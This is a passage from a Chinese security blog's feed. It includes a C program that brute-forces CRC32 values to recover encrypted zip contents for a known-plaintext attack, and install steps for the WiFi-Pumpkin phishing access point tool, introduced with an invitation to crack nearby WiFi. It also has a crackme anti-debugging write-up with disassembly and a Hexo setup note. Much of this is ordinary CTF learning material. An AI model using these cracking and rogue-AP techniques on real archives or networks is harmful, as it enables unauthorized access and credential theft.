class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">Crc32_ComputeBuf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> bufLen)</span> </span>&#123;</div><div class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> crcTable[<span class="number">256</span>] = &#123;</div><div class="line"><span class="number">0x00000000</span>,<span class="number">0x77073096</span>,<span class="number">0xEE0E612C</span>,<span class="number">0x990951BA</span>,<span class="number">0x076DC419</span>,<span class="number">0x706AF48F</span>,<span class="number">0xE963A535</span>,</div><div class="line"><span class="number">0x9E6495A3</span>,<span class="number">0x0EDB8832</span>,<span class="number">0x79DCB8A4</span>,<span class="number">0xE0D5E91E</span>,<span class="number">0x97D2D988</span>,<span class="number">0x09B64C2B</span>,<span class="number">0x7EB17CBD</span>,</div><div class="line"><span class="number">0xE7B82D07</span>,<span class="number">0x90BF1D91</span>,<span class="number">0x1DB71064</span>,<span class="number">0x6AB020F2</span>,<span class="number">0xF3B97148</span>,<span class="number">0x84BE41DE</span>,<span class="number">0x1ADAD47D</span>,</div><div class="line"><span class="number">0x6DDDE4EB</span>,<span class="number">0xF4D4B551</span>,<span class="number">0x83D385C7</span>,<span class="number">0x136C9856</span>,<span class="number">0x646BA8C0</span>,<span class="number">0xFD62F97A</span>,<span class="number">0x8A65C9EC</span>,</div><div class="line"><span class="number">0x14015C4F</span>,<span class="number">0x63066CD9</span>,<span class="number">0xFA0F3D63</span>,<span class="number">0x8D080DF5</span>,<span class="number">0x3B6E20C8</span>,<span class="number">0x4C69105E</span>,<span class="number">0xD56041E4</span>,</div><div class="line"><span class="number">0xA2677172</span>,<span class="number">0x3C03E4D1</span>,<span class="number">0x4B04D447</span>,<span class="number">0xD20D85FD</span>,<span class="number">0xA50AB56B</span>,<span class="number">0x35B5A8FA</span>,<span class="number">0x42B2986C</span>,</div><div class="line"><span class="number">0xDBBBC9D6</span>,<span class="number">0xACBCF940</span>,<span class="number">0x32D86CE3</span>,<span class="number">0x45DF5C75</span>,<span class="number">0xDCD60DCF</span>,<span class="number">0xABD13D59</span>,<span class="number">0x26D930AC</span>,</div><div class="line"><span class="number">0x51DE003A</span>,<span class="number">0xC8D75180</span>,<span class="number">0xBFD06116</span>,<span class="number">0x21B4F4B5</span>,<span class="number">0x56B3C423</span>,<span class="number">0xCFBA9599</span>,<span class="number">0xB8BDA50F</span>,</div><div class="line"><span class="number">0x2802B89E</span>,<span class="number">0x5F058808</span>,<span class="number">0xC60CD9B2</span>,<span class="number">0xB10BE924</span>,<span class="number">0x2F6F7C87</span>,<span class="number">0x58684C11</span>,<span class="number">0xC1611DAB</span>,</div><div class="line"><span class="number">0xB6662D3D</span>,<span class="number">0x76DC4190</span>,<span class="number">0x01DB7106</span>,<span class="number">0x98D220BC</span>,<span class="number">0xEFD5102A</span>,<span class="number">0x71B18589</span>,<span class="number">0x06B6B51F</span>,</div><div class="line"><span class="number">0x9FBFE4A5</span>,<span class="number">0xE8B8D433</span>,<span class="number">0x7807C9A2</span>,<span class="number">0x0F00F934</span>,<span class="number">0x9609A88E</span>,<span class="number">0xE10E9818</span>,<span class="number">0x7F6A0DBB</span>,</div><div class="line"><span class="number">0x086D3D2D</span>,<span class="number">0x91646C97</span>,<span class="number">0xE6635C01</span>,<span class="number">0x6B6B51F4</span>,<span class="number">0x1C6C6162</span>,<span class="number">0x856530D8</span>,<span class="number">0xF262004E</span>,</div><div class="line"><span class="number">0x6C0695ED</span>,<span class="number">0x1B01A57B</span>,<span class="number">0x8208F4C1</span>,<span class="number">0xF50FC457</span>,<span class="number">0x65B0D9C6</span>,<span class="number">0x12B7E950</span>,<span class="number">0x8BBEB8EA</span>,</div><div class="line"><span class="number">0xFCB9887C</span>,<span class="number">0x62DD1DDF</span>,<span class="number">0x15DA2D49</span>,<span class="number">0x8CD37CF3</span>,<span class="number">0xFBD44C65</span>,<span class="number">0x4DB26158</span>,<span class="number">0x3AB551CE</span>,</div><div class="line"><span class="number">0xA3BC0074</span>,<span class="number">0xD4BB30E2</span>,<span class="number">0x4ADFA541</span>,<span class="number">0x3DD895D7</span>,<span class="number">0xA4D1C46D</span>,<span class="number">0xD3D6F4FB</span>,<span class="number">0x4369E96A</span>,</div><div class="line"><span class="number">0x346ED9FC</span>,<span class="number">0xAD678846</span>,<span class="number">0xDA60B8D0</span>,<span class="number">0x44042D73</span>,<span class="number">0x33031DE5</span>,<span class="number">0xAA0A4C5F</span>,<span class="number">0xDD0D7CC9</span>,</div><div class="line"><span class="number">0x5005713C</span>,<span class="number">0x270241AA</span>,<span class="number">0xBE0B1010</span>,<span class="number">0xC90C2086</span>,<span class="number">0x5768B525</span>,<span class="number">0x206F85B3</span>,<span class="number">0xB966D409</span>,</div><div class="line"><span class="number">0xCE61E49F</span>,<span class="number">0x5EDEF90E</span>,<span class="number">0x29D9C998</span>,<span class="number">0xB0D09822</span>,<span class="number">0xC7D7A8B4</span>,<span class="number">0x59B33D17</span>,<span class="number">0x2EB40D81</span>,</div><div class="line"><span class="number">0xB7BD5C3B</span>,<span class="number">0xC0BA6CAD</span>,<span class="number">0xEDB88320</span>,<span class="number">0x9ABFB3B6</span>,<span class="number">0x03B6E20C</span>,<span class="number">0x74B1D29A</span>,<span class="number">0xEAD54739</span>,</div><div class="line"><span class="number">0x9DD277AF</span>,<span class="number">0x04DB2615</span>,<span class="number">0x73DC1683</span>,<span class="number">0xE3630B12</span>,<span class="number">0x94643B84</span>,<span class="number">0x0D6D6A3E</span>,<span class="number">0x7A6A5AA8</span>,</div><div class="line"><span class="number">0xE40ECF0B</span>,<span class="number">0x9309FF9D</span>,<span class="number">0x0A00AE27</span>,<span class="number">0x7D079EB1</span>,<span class="number">0xF00F9344</span>,<span class="number">0x8708A3D2</span>,<span class="number">0x1E01F268</span>,</div><div class="line"><span class="number">0x6906C2FE</span>,<span class="number">0xF762575D</span>,<span class="number">0x806567CB</span>,<span class="number">0x196C3671</span>,<span class="number">0x6E6B06E7</span>,<span class="number">0xFED41B76</span>,<span class="number">0x89D32BE0</span>,</div><div class="line"><span class="number">0x10DA7A5A</span>,<span class="number">0x67DD4ACC</span>,<span class="number">0xF9B9DF6F</span>,<span class="number">0x8EBEEFF9</span>,<span class="number">0x17B7BE43</span>,<span class="number">0x60B08ED5</span>,<span class="number">0xD6D6A3E8</span>,</div><div class="line"><span class="number">0xA1D1937E</span>,<span class="number">0x38D8C2C4</span>,<span class="number">0x4FDFF252</span>,<span class="number">0xD1BB67F1</span>,<span class="number">0xA6BC5767</span>,<span class="number">0x3FB506DD</span>,<span class="number">0x48B2364B</span>,</div><div class="line"><span class="number">0xD80D2BDA</span>,<span class="number">0xAF0A1B4C</span>,<span class="number">0x36034AF6</span>,<span class="number">0x41047A60</span>,<span class="number">0xDF60EFC3</span>,<span class="number">0xA867DF55</span>,<span class="number">0x316E8EEF</span>,</div><div class="line"><span class="number">0x4669BE79</span>,<span class="number">0xCB61B38C</span>,<span class="number">0xBC66831A</span>,<span class="number">0x256FD2A0</span>,<span class="number">0x5268E236</span>,<span class="number">0xCC0C7795</span>,<span class="number">0xBB0B4703</span>,</div><div class="line"><span class="number">0x220216B9</span>,<span class="number">0x5505262F</span>,<span class="number">0xC5BA3BBE</span>,<span class="number">0xB2BD0B28</span>,<span class="number">0x2BB45A92</span>,<span class="number">0x5CB36A04</span>,<span class="number">0xC2D7FFA7</span>,</div><div class="line"><span class="number">0xB5D0CF31</span>,<span class="number">0x2CD99E8B</span>,<span class="number">0x5BDEAE1D</span>,<span class="number">0x9B64C2B0</span>,<span class="number">0xEC63F226</span>,<span class="number">0x756AA39C</span>,<span class="number">0x026D930A</span>,</div><div class="line"><span class="number">0x9C0906A9</span>,<span class="number">0xEB0E363F</span>,<span class="number">0x72076785</span>,<span class="number">0x05005713</span>,<span class="number">0x95BF4A82</span>,<span class="number">0xE2B87A14</span>,<span class="number">0x7BB12BAE</span>,</div><div class="line"><span class="number">0x0CB61B38</span>,<span class="number">0x92D28E9B</span>,<span class="number">0xE5D5BE0D</span>,<span class="number">0x7CDCEFB7</span>,<span class="number">0x0BDBDF21</span>,<span class="number">0x86D3D2D4</span>,<span class="number">0xF1D4E242</span>,</div><div class="line"><span class="number">0x68DDB3F8</span>,<span class="number">0x1FDA836E</span>,<span class="number">0x81BE16CD</span>,<span class="number">0xF6B9265B</span>,<span class="number">0x6FB077E1</span>,<span class="number">0x18B74777</span>,<span class="number">0x88085AE6</span>,</div><div class="line"><span class="number">0xFF0F6A70</span>,<span class="number">0x66063BCA</span>,<span class="number">0x11010B5C</span>,<span class="number">0x8F659EFF</span>,<span class="number">0xF862AE69</span>,<span class="number">0x616BFFD3</span>,<span class="number">0x166CCF45</span>,</div><div class="line"><span class="number">0xA00AE278</span>,<span class="number">0xD70DD2EE</span>,<span class="number">0x4E048354</span>,<span class="number">0x3903B3C2</span>,<span class="number">0xA7672661</span>,<span class="number">0xD06016F7</span>,<span class="number">0x4969474D</span>,</div><div class="line"><span class="number">0x3E6E77DB</span>,<span class="number">0xAED16A4A</span>,<span class="number">0xD9D65ADC</span>,<span class="number">0x40DF0B66</span>,<span class="number">0x37D83BF0</span>,<span class="number">0xA9BCAE53</span>,<span class="number">0xDEBB9EC5</span>,</div><div class="line"><span class="number">0x47B2CF7F</span>,<span class="number">0x30B5FFE9</span>,<span class="number">0xBDBDF21C</span>,<span class="number">0xCABAC28A</span>,<span class="number">0x53B39330</span>,<span class="number">0x24B4A3A6</span>,<span class="number">0xBAD03605</span>,</div><div class="line"><span class="number">0xCDD70693</span>,<span class="number">0x54DE5729</span>,<span class="number">0x23D967BF</span>,<span class="number">0xB3667A2E</span>,<span class="number">0xC4614AB8</span>,<span class="number">0x5D681B02</span>,<span class="number">0x2A6F2B94</span>,</div><div class="line"><span class="number">0xB40BBE37</span>,<span class="number">0xC30C8EA1</span>,<span class="number">0x5A05DF1B</span>,<span class="number">0x2D02EF8D</span></div><div class="line">&#125;;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> crc32 = <span class="number">0xFFFFFFFF</span>;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *byteBuf;</div><div class="line"><span class="keyword">size_t</span> i;</div><div class="line"></div><div class="line">byteBuf = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)buf;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; bufLen; i++) &#123;</div><div class="line">crc32 = (crc32 &gt;&gt; <span class="number">8</span>) ^ crcTable[(crc32 ^ byteBuf[i]) &amp; <span class="number">0xFF</span>];</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> crc32 ^ <span class="number">0xFFFFFFFF</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> *charSet = <span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@\n "</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> crc32[] = &#123; <span class="number">1606238046</span>, <span class="number">1943531056</span>, <span class="number">3598719407L</span>, <span class="number">2578797435L</span>, <span class="number">1405086858</span>, <span class="number">2143805016</span>, <span class="number">3234701029L</span>, <span class="number">3224637410L</span>, </div><div class="line"><span class="number">2346013297L</span>, <span class="number">1146766327</span>, <span class="number">4038678768L</span>, <span class="number">3119445409L</span>, <span class="number">2111148220</span>, <span class="number">383413051</span>, <span class="number">2853461348L</span>, <span class="number">3176759361L</span>, <span class="number">1852520927</span>, </div><div class="line"><span class="number">3083243303L</span>, <span class="number">2151747034L</span>, <span class="number">1392140456</span>, <span class="number">544449252</span>, <span class="number">1871340857</span>, <span class="number">574988077</span>, <span class="number">3459049483L</span>, <span class="number">2786065872L</span>, <span class="number">3888485555L</span>, </div><div class="line"><span class="number">1716930793</span>, <span class="number">1933746678</span>, <span class="number">3178216769L</span>, <span class="number">3774357278L</span>, <span class="number">622718466</span>, <span class="number">1488109481</span>, <span class="number">525106857</span>, <span class="number">3123386181L</span>, <span class="number">3472027048L</span>, </div><div class="line"><span class="number">616379830</span>, <span class="number">3728848209L</span>, <span class="number">1358333123</span>, <span class="number">1852520927</span>, <span class="number">3096466191L</span>, <span class="number">622718466</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">char</span> tmp[<span class="number">6</span>] = <span class="string">""</span>;</div><div class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(charSet);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="keyword">sizeof</span>(crc32) / <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) - <span class="number">1</span>;h&gt;=<span class="number">0</span>; h--) &#123;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; len; a++) &#123;</div><div class="line">tmp[<span class="number">0</span>] = charSet[a];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; len; b++) &#123;</div><div class="line">tmp[<span class="number">1</span>] = charSet[b];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> c = <span class="number">0</span>; c &lt; len; c++) &#123;</div><div class="line">tmp[<span class="number">2</span>] = charSet[c];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> d = <span class="number">0</span>; d &lt; len; d++) &#123;</div><div class="line">tmp[<span class="number">3</span>] = charSet[d];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> e = <span class="number">0</span>; e &lt; len; e++) &#123;</div><div class="line">tmp[<span class="number">4</span>] = charSet[e];</div><div class="line"><span class="keyword">if</span> (Crc32_ComputeBuf(tmp, <span class="built_in">strlen</span>(tmp)) == crc32[h]) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, tmp);</div><div class="line"><span class="comment">//goto label;//若是存在碰撞，那么这里可以将这里注释掉</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">label :;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>得到明文，要看看是什么压缩算法的，只有压缩算法相同，才能用已知明文攻击。查看加密算法，建议用7z查看，将得到的明文加密，在与需要解密的压缩包做比较，这样算法一样的，就可以用已知明文攻击<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flgecoxxaej31100nwq6m.jpg" alt=""><br>可以用ARCHPR和AZPR这里贴个链接吧<br><a href="https://jingyan.baidu.com/article/3052f5a1f62d6597f31f861c.html" target="_blank" rel="external">https://jingyan.baidu.com/article/3052f5a1f62d6597f31f861c.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当然是有秘密不能给汝看&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>hexo安装配置</title>
    <link href="http://yoursite.com/2017/11/09/misc_hexo/"/>
    <id>http://yoursite.com/2017/11/09/misc_hexo/</id>
    <published>2017-11-09T11:31:23.091Z</published>
    <updated>2017-11-09T11:38:13.078Z</updated>
    
    <content type="html"><![CDATA[<p>颜值即正义<br><a id="more"></a></p><h2 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h2><p><a href="http://blog.betamao.me/2017/08/24/COS%E5%8A%A0CDN%E9%83%A8%E7%BD%B2HEXO/#more" target="_blank" rel="external">http://blog.betamao.me/2017/08/24/COS%E5%8A%A0CDN%E9%83%A8%E7%BD%B2HEXO/#more</a></p><h2 id="2、换主题"><a href="#2、换主题" class="headerlink" title="2、换主题"></a>2、换主题</h2><p><a href="http://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" rel="external">http://blog.csdn.net/qq_33699981/article/details/72716951</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;颜值即正义&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WIFI破解密码</title>
    <link href="http://yoursite.com/2017/11/09/misc_wifi/"/>
    <id>http://yoursite.com/2017/11/09/misc_wifi/</id>
    <published>2017-11-09T06:32:11.621Z</published>
    <updated>2017-11-10T01:20:14.655Z</updated>
    
    <content type="html"><![CDATA[<p>到处都是wifi，那就破解吧，贼好用<br><a id="more"></a></p><h2 id="1、WIFI破解密码"><a href="#1、WIFI破解密码" class="headerlink" title="1、WIFI破解密码"></a>1、WIFI破解密码</h2><h2 id="2、钓鱼WiFi"><a href="#2、钓鱼WiFi" class="headerlink" title="2、钓鱼WiFi"></a>2、钓鱼WiFi</h2><p>需要安装 Pyqt4<br>安装类库<br><code>pip install -r requirements.txt</code><br>安装:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git</div><div class="line">cd WiFi-Pumpkin</div><div class="line">chmod +x installer.sh</div><div class="line">./installer.sh --install</div></pre></td></tr></table></figure></p><p>安装成功<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flbtpq4f9bj30r50h8dho.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;到处都是wifi，那就破解吧，贼好用&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE——反调试</title>
    <link href="http://yoursite.com/2017/11/08/re_kx3/"/>
    <id>http://yoursite.com/2017/11/08/re_kx3/</id>
    <published>2017-11-08T09:21:27.043Z</published>
    <updated>2017-11-09T12:46:38.589Z</updated>
    
    <content type="html"><![CDATA[<p>去膜拜看雪师傅啦<br><a id="more"></a></p><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1kUYItoz" target="_blank" rel="external">http://pan.baidu.com/s/1kUYItoz</a> 密码：xem0<br>学习为主。看大神们的记录，学习一遍</p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试<br>二、OD附加，过反调试<br>先运行exe程序，再打开od附加exe进程，再调用GetWindowTextW的API时候下断点，点击运行，exe程序输入sn,此时会断在od中的GetWindowTextW的断点（还在api系统区）<br><img src="" alt=""><br>往下走来到程序区<br><img src="" alt=""><br>往下走,主要细节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div></pre></td><td class="code"><pre><div class="line">01151CB0    55              push    ebp</div><div class="line">01151CB1    8BEC            mov     ebp, esp</div><div class="line">01151CB3    81EC D0000000   sub     esp, 0xD0</div><div class="line">01151CB9    A1 14F01601     mov     eax, dword ptr [0x116F014]</div><div class="line">01151CBE    33C5            xor     eax, ebp</div><div class="line">01151CC0    8945 FC         mov     dword ptr [ebp-0x4], eax</div><div class="line">01151CC3    57              push    edi</div><div class="line">01151CC4    8BF9            mov     edi, ecx</div><div class="line">01151CC6    85FF            test    edi, edi</div><div class="line">01151CC8    0F84 61010000   je      01151E2F</div><div class="line">01151CCE    85D2            test    edx, edx</div><div class="line">01151CD0    0F85 81000000   jnz     01151D57</div><div class="line">01151CD6    E8 25FFFFFF     call    01151C00       ;判断注册码是否包含&apos;b&apos;</div><div class="line">01151CDB    85C0            test    eax, eax</div><div class="line">01151CDD    74 54           je      short 01151D33</div><div class="line">01151CDF    68 C8000000     push    0xC8</div><div class="line">01151CE4    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151CEA    6A 00           push    0x0</div><div class="line">01151CEC    50              push    eax</div><div class="line">01151CED    E8 DE1C0000     call    &lt;memset&gt;</div><div class="line">01151CF2    83C4 0C         add     esp, 0xC</div><div class="line">01151CF5    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151CFB    6A 64           push    0x64</div><div class="line">01151CFD    50              push    eax</div><div class="line">01151CFE    FF77 0C         push    dword ptr [edi+0xC]</div><div class="line">01151D01    FF15 4C811601   call    dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW</div><div class="line">01151D07    6A 70           push    0x70</div><div class="line">01151D09    8D95 34FFFFFF   lea     edx, dword ptr [ebp-0xCC]</div><div class="line">01151D0F    E8 3C0D0000     call    01152A50    ; 判断注册码里是否包含&apos;p&apos;</div><div class="line">01151D14    85C0            test    eax, eax</div><div class="line">01151D16    74 1B           je      short 01151D33</div><div class="line">01151D18    BA 01000000     mov     edx, 0x1</div><div class="line">01151D1D    8BCF            mov     ecx, edi</div><div class="line">01151D1F    E8 8CFFFFFF     call    01151CB0</div><div class="line">01151D24    5F              pop     edi</div><div class="line">01151D25    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D28    33CD            xor     ecx, ebp</div><div class="line">01151D2A    E8 960F0000     call    01152CC5</div><div class="line">01151D2F    8BE5            mov     esp, ebp</div><div class="line">01151D31    5D              pop     ebp</div><div class="line">01151D32    C3              retn</div><div class="line">01151D33    6A 00           push    0x0</div><div class="line">01151D35    68 0F040000     push    0x40F</div><div class="line">01151D3A    68 11010000     push    0x111</div><div class="line">01151D3F    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151D42    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151D48    5F              pop     edi</div><div class="line">01151D49    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D4C    33CD            xor     ecx, ebp</div><div class="line">01151D4E    E8 720F0000     call    01152CC5</div><div class="line">01151D53    8BE5            mov     esp, ebp</div><div class="line">01151D55    5D              pop     ebp</div><div class="line">01151D56    C3              retn</div><div class="line">01151D33    6A 00           push    0x0</div><div class="line">01151D35    68 0F040000     push    0x40F</div><div class="line">01151D3A    68 11010000     push    0x111</div><div class="line">01151D3F    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151D42    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151D48    5F              pop     edi</div><div class="line">01151D49    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D4C    33CD            xor     ecx, ebp</div><div class="line">01151D4E    E8 720F0000     call    01152CC5</div><div class="line">01151D53    8BE5            mov     esp, ebp</div><div class="line">01151D55    5D              pop     ebp</div><div class="line">01151D56    C3              retn</div><div class="line">01151D57    56              push    esi</div><div class="line">01151D58    E8 812B0000     call    011548DE</div><div class="line">01151D5D    68 C8000000     push    0xC8</div><div class="line">01151D62    8985 30FFFFFF   mov     dword ptr [ebp-0xD0], eax</div><div class="line">01151D68    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D6E    6A 00           push    0x0</div><div class="line">01151D70    50              push    eax</div><div class="line">01151D71    E8 5A1C0000     call    &lt;memset&gt;</div><div class="line">01151D76    83C4 0C         add     esp, 0xC</div><div class="line">01151D79    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D7F    68 C8000000     push    0xC8</div><div class="line">01151D84    50              push    eax</div><div class="line">01151D85    FF77 0C         push    dword ptr [edi+0xC]</div><div class="line">01151D88    FF15 4C811601   call    dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW</div><div class="line">01151D8E    33F6            xor     esi, esi</div><div class="line">01151D90    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D96    66:39B5 34FFFFF&gt;cmp     word ptr [ebp-0xCC], si</div><div class="line">01151D9D    74 0B           je      short 01151DAA</div><div class="line">01151D9F    90              nop</div><div class="line">01151DA0    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151DA3    46              inc     esi</div><div class="line">01151DA4    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151DA8  ^ 75 F6           jnz     short 01151DA0</div><div class="line">01151DAA    33C9            xor     ecx, ecx</div><div class="line">01151DAC    8D46 01         lea     eax, dword ptr [esi+0x1]</div><div class="line">01151DAF    BA 02000000     mov     edx, 0x2</div><div class="line">01151DB4    F7E2            mul     edx</div><div class="line">01151DB6    53              push    ebx</div><div class="line">01151DB7    0F90C1          seto    cl</div><div class="line">01151DBA    F7D9            neg     ecx</div><div class="line">01151DBC    0BC8            or      ecx, eax</div><div class="line">01151DBE    51              push    ecx</div><div class="line">01151DBF    E8 120F0000     call    01152CD6</div><div class="line">01151DC4    83C4 04         add     esp, 0x4</div><div class="line">01151DC7    8BD8            mov     ebx, eax</div><div class="line">01151DC9    E8 102B0000     call    011548DE</div><div class="line">01151DCE    2B85 30FFFFFF   sub     eax, dword ptr [ebp-0xD0]</div><div class="line">01151DD4    83F8 02         cmp     eax, 0x2</div><div class="line">01151DD7    7F 65           jg      short 01151E3E</div><div class="line">01151DD9    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151DDF    50              push    eax</div><div class="line">01151DE0    53              push    ebx</div><div class="line">01151DE1    E8 8A0A0000     call    01152870</div><div class="line">01151DE6    83FE 07         cmp     esi, 0x7           ;注册码是否为7位</div><div class="line">01151DE9    73 0B           jnb     short 01151DF6</div><div class="line">01151DEB    6A 00           push    0x0</div><div class="line">01151DED    6A 00           push    0x0</div><div class="line">01151DEF    68 0E040000     push    0x40E</div><div class="line">01151DF4    EB 0B           jmp     short 01151E01</div><div class="line">01151DF6    76 2C           jbe     short 01151E24</div><div class="line">01151DF8    6A 00           push    0x0</div><div class="line">01151DFA    6A 00           push    0x0</div><div class="line">01151DFC    68 0D040000     push    0x40D</div><div class="line">01151E01    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151E04    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151E0A    53              push    ebx</div><div class="line">01151E0B    E8 CF0E0000     call    01152CDF</div><div class="line">01151E10    83C4 04         add     esp, 0x4</div><div class="line">01151E13    5B              pop     ebx</div><div class="line">01151E14    5E              pop     esi</div><div class="line">01151E15    5F              pop     edi</div><div class="line">01151E16    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151E19    33CD            xor     ecx, ebp</div><div class="line">01151E1B    E8 A50E0000     call    01152CC5</div><div class="line">01151E20    8BE5            mov     esp, ebp</div><div class="line">01151E22    5D              pop     ebp</div><div class="line">01151E23    C3              retn</div><div class="line">01151E24    8BD3            mov     edx, ebx</div><div class="line">01151E26    8BCF            mov     ecx, edi</div><div class="line">01151E28    E8 33FCFFFF     call    01151A60        ;这里进入最后的判断</div><div class="line">01151E2D    5B              pop     ebx</div><div class="line">01151E2E   